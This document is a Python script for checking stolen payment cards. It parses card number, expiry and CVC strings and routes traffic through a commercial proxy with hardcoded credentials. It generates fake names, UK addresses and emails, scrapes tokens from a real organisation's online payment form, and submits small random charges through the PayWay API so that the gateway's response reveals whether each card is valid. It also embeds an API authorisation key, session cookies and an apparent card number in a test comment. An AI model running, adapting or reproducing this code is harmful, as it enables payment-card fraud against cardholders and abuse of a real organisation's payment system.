import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    #elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        #mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    d1 = random.randint(1, 4)
    d2 = random.randint(1, 99)
    
    headers = {
        'authority': 'www.nrh.org.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'if-none-match': '"2189-1776864691;br"',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://www.nrh.org.au/pay-online/', headers=headers)
    
    path = re.search(r'src="//nrh.snapforms.com.au/embed-(.*?).js"', response.text).group(1)
    #print(path)
    
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IlUrTEdqeXhwV0xhT1hvOU8rVGEwbVE9PSIsInZhbHVlIjoiTGJxdGxqYlI1UVFnS1lBUXlZQzNVaWVRRVQ2S0dOTkFIQUM2QWZDN0pGekxBdlUxWWVSWjVtbysvYy9Fdk9yOFZzWWE5N2c1QmhYRFAyd2ZBMHVLTkVaZEl4YlFXbGVOMHdwSW40VTRQa25ZWHY5VEp0NUJDRy9CRW8wOU1TVWYiLCJtYWMiOiIyZTNlNzc2NzM2MzVkZDU1YWY0NmQwMTczZGQwYjdjOGEwNjFjOTA2Y2M1YzhiNDJjMTE2Zjg3MTQ0ZTFiMmQ3IiwidGFnIjoiIn0%3D',
        'snapforms_session': 'eyJpdiI6IkdZamdaZVAyNyt0Zjc4WTBveXBjSmc9PSIsInZhbHVlIjoiV1BEck03NFZLTDJnQ281eE9nTVA0NzJsSlFoVUh2WnZ1OHlXMGExeXFlTnZJc3hkNStvNFd3Y1Z1d3I3cE01ZkZMUmpRRGcrZ1JrU1Bqc3lWSlgxdUlML1Zqcm5SS3lOU0JrRzFXdkE2aDB1RnNLbTQrQVFnaCtxMENKM3RwNEYiLCJtYWMiOiI0Y2NkZjU3M2I0ZDA1NTg2YWZlYzRjMDI2NGQxYzdlYzk4YzRlZTk0NDFlMDJkOGYyOTRjMDU5OTQzYWNjMjEzIiwidGFnIjoiIn0%3D',
    }
    
    headers = {
        'authority': 'nrh.snapforms.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlUrTEdqeXhwV0xhT1hvOU8rVGEwbVE9PSIsInZhbHVlIjoiTGJxdGxqYlI1UVFnS1lBUXlZQzNVaWVRRVQ2S0dOTkFIQUM2QWZDN0pGekxBdlUxWWVSWjVtbysvYy9Fdk9yOFZzWWE5N2c1QmhYRFAyd2ZBMHVLTkVaZEl4YlFXbGVOMHdwSW40VTRQa25ZWHY5VEp0NUJDRy9CRW8wOU1TVWYiLCJtYWMiOiIyZTNlNzc2NzM2MzVkZDU1YWY0NmQwMTczZGQwYjdjOGEwNjFjOTA2Y2M1YzhiNDJjMTE2Zjg3MTQ0ZTFiMmQ3IiwidGFnIjoiIn0%3D; snapforms_session=eyJpdiI6IkdZamdaZVAyNyt0Zjc4WTBveXBjSmc9PSIsInZhbHVlIjoiV1BEck03NFZLTDJnQ281eE9nTVA0NzJsSlFoVUh2WnZ1OHlXMGExeXFlTnZJc3hkNStvNFd3Y1Z1d3I3cE01ZkZMUmpRRGcrZ1JrU1Bqc3lWSlgxdUlML1Zqcm5SS3lOU0JrRzFXdkE2aDB1RnNLbTQrQVFnaCtxMENKM3RwNEYiLCJtYWMiOiI0Y2NkZjU3M2I0ZDA1NTg2YWZlYzRjMDI2NGQxYzdlYzk4YzRlZTk0NDFlMDJkOGYyOTRjMDU5OTQzYWNjMjEzIiwidGFnIjoiIn0%3D',
        'referer': 'https://www.nrh.org.au/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get(f'https://nrh.snapforms.com.au/form/{path}', #cookies=cookies, 
    headers=headers)
    
    fieldid = re.search(r'type="hidden" name="field_(.*?)"', response.text).group(1)
    formtoken = re.search(r'name="itoken" value="(.*?)"', response.text).group(1)
    #print(fieldid, formtoken)
    
    headers = {
        'authority': 'api.payway.com.au',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'authorization': 'Basic UTMyMTc3X1BVQl92dXh5NTk3OGNuNHhodXQ2dmp6ejh6ODVoZTh5MmpqcjZiMnp6cnoyZHd5bWc3anhkNnVydXFwaHVlYXE6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://api.payway.com.au',
        'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-no-authenticate-basic': 'true',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'paymentMethod': 'creditCard',
        'connectionType': 'FRAME',
        'cardNumber': f'{n}',
        'cvn': f'{cvc}',
        'cardholderName': 'Yell Htet',
        'expiryDateMonth': f'{mm}',
        'expiryDateYear': f'{yy}',
        'threeDS2': 'false',
    }
    
    response = session.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
    
    tok = response.json()['singleUseTokenId']
    #print(tok)
    
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IjFXTXZDaStoNlFyM1dCUzZpd21BblE9PSIsInZhbHVlIjoiakNFQ05UVkhMTVVDNmV3MkF3QXk2YzlXaGUzZ3VJMis5SDI2Y2JjbXYxY0oxcHdkbUxwazZhQkpJdWZ5T1Jxdjg3SU5McVdXaHg3ZzhwdWxqNjFaeS9EcVIvb2ZaYkw4cXNCZGFnNWprTlFOTnY4dTRMOU8yU0tOcEJTNUQrYWUiLCJtYWMiOiJhZTQxMmYwNWZlMDkzZWMxMTk0YzllYzZkNGJlZGY0YmExNjhkMmEyNTlkNWM0YTNlOGI4ODAxNzQ3MzlhZWM3IiwidGFnIjoiIn0%3D',
        'snapforms_session': 'eyJpdiI6IlNZQzdib01GbTB1RHB4U0dUNjFtZVE9PSIsInZhbHVlIjoiMTdWelVka2RBWUkwbjhCZENiNXhJdzUrRXdhNWVrVDR1L1pmaFUwRHNiZXRkdnN3UGdXUzVZQjFMUTg5MXJMWllOVFZxRE1ONTJIS0QwWDZpZTduNHVDQ3JONlFBSHFwUDBSRm82VW5tbmszTkVUQ1hBZHNDVXVOenNEK0tXcngiLCJtYWMiOiJjODQ2Yjc1Y2M4NjQ4NTFkYjAxYTQxN2IxMTQ3Yzk3NzQwMGMyOWFlNTE3YmRhYTQxOTUwYjVkODFmMWQ1OTM0IiwidGFnIjoiIn0%3D',
    }
    
    headers = {
        'authority': 'nrh.snapforms.com.au',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IjFXTXZDaStoNlFyM1dCUzZpd21BblE9PSIsInZhbHVlIjoiakNFQ05UVkhMTVVDNmV3MkF3QXk2YzlXaGUzZ3VJMis5SDI2Y2JjbXYxY0oxcHdkbUxwazZhQkpJdWZ5T1Jxdjg3SU5McVdXaHg3ZzhwdWxqNjFaeS9EcVIvb2ZaYkw4cXNCZGFnNWprTlFOTnY4dTRMOU8yU0tOcEJTNUQrYWUiLCJtYWMiOiJhZTQxMmYwNWZlMDkzZWMxMTk0YzllYzZkNGJlZGY0YmExNjhkMmEyNTlkNWM0YTNlOGI4ODAxNzQ3MzlhZWM3IiwidGFnIjoiIn0%3D; snapforms_session=eyJpdiI6IlNZQzdib01GbTB1RHB4U0dUNjFtZVE9PSIsInZhbHVlIjoiMTdWelVka2RBWUkwbjhCZENiNXhJdzUrRXdhNWVrVDR1L1pmaFUwRHNiZXRkdnN3UGdXUzVZQjFMUTg5MXJMWllOVFZxRE1ONTJIS0QwWDZpZTduNHVDQ3JONlFBSHFwUDBSRm82VW5tbmszTkVUQ1hBZHNDVXVOenNEK0tXcngiLCJtYWMiOiJjODQ2Yjc1Y2M4NjQ4NTFkYjAxYTQxN2IxMTQ3Yzk3NzQwMGMyOWFlNTE3YmRhYTQxOTUwYjVkODFmMWQ1OTM0IiwidGFnIjoiIn0%3D',
        'origin': 'https://nrh.snapforms.com.au',
        'referer': 'https://nrh.snapforms.com.au/form/HAKZK05lMR',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'fieldid': f'{fieldid}',
        'formtoken': f'{formtoken}',
        'token': f'{tok}',
        'amount': f'{d1}.{d2}',
    }
    
    response = session.post('https://nrh.snapforms.com.au/paywayDirect', #cookies=cookies, 
    headers=headers, data=data)
    
    try:
        result = re.search(r'"error":"(.*?)"', response.text).group(1)
    except:
        result = response.text

    return result
    
#test_card = "5132848403801477|04|2026|399"
#print(Tele(test_card))
